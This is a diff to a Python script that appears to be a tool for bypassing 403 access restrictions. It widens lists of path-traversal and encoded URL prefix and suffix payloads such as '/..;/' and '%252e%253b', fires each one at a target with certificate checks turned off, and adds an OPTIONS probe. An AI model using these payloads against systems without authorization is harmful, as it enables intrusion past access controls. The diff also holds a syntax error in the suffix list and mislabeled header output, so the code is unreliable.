@@ -25,13 +25,14 @@ headers = {
 "Upgrade-Insecure-Requests": "1"}
 
 prefixPayloads = [
-'/.;/', '/..;/', '//', '/./', '/.//', '/..//', '/%2e%3b/', '/%2e%2e%3b/',
-'%2f/', '/%2f', '%2f%2f', '/%2e/', '/%2e%2f/', '/%2e%2e%2f/', '/%252e%253b/',
-'/%252e%252e%253b/', '%252f%252f', '%252f/', '/%252f', '/%252e/', '/%252e%252f/',
-'/%252e%252e%252f/']
+'//', '/;/', '/;//', '/./', '/.//', '/.;/', '/.;//', '/../', '/..', '/..//', '/..;/',
+'/..;//', '%2f%2f', '%2f/', '/%2f', '/%3b/', '%2f%3b%2f', '%2f%3b%2f%2f', '/%2e/',
+'/%2e//', '/%2e%3b/', '/%2e%3b//', '/%2e%2e/', '/%2e%2e', '/%2e%2e%3b/', '/%2e%2f/',
+'/%2e%2e%2f/', '/%252e%253b/', '/%252e%252e%253b/', '%252f%252f', '%252f/',
+'/%252f', '/%252e/', '/%252e%252f/', '/%252e%252e%252f/']
 
 suffixPayloads = [
-';','.html','.json','#', '/%20']
+';', '/', '/./', '/../'. '.html','.json','#', '/%20']
 
 def preAndPost(parsed):
 	finalUrls = []
@@ -72,6 +73,13 @@ def sendFinalPayloads(finalUrls):
 		resp = requests.get(url, headers=headers, verify=False)
 		print("Response code: {}   Response length: {}   Path: {}\n".format(resp.status_code, len(resp.text), path))
 
+def sendOPTIONS():
+	resp = requests.options(url, headers=headers, verify=False)
+	print("Response code: {}   Response length: {}   Sent OPTIONS method. \n\
+Response length was 0 so probably NOT worth checking out....\n".format(resp.status_code, len(resp.text)))
+	print("Response Headers: ")
+	for h,v in resp.request.headers.items():
+		print("{}: {}".format(h,v))
 
 url = args.url
 parsed = urlparse(url)
@@ -82,3 +90,4 @@ finalUrls = preAndPost(parsed)
 
 sendHeaders(url, path)
 sendFinalPayloads(finalUrls)
+sendOPTIONS()
